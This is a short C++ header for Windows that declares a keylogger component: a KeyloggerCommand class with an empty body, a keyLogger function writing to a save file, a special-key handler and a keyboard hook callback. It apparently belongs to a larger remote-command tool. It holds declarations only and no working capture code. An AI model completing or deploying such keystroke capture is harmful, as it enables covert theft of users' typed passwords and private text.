#pragma once

#include <windows.h>
#include <fstream>
#include <mutex>
#include "serviceCommand.h"

extern std::mutex logMutex;
extern std::string logData;

namespace Services {
    class KeyloggerCommand : public Command {

    };
    bool keyLogger(const std::string &saveFile);
}
bool SpecialKeys(int S_Key);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);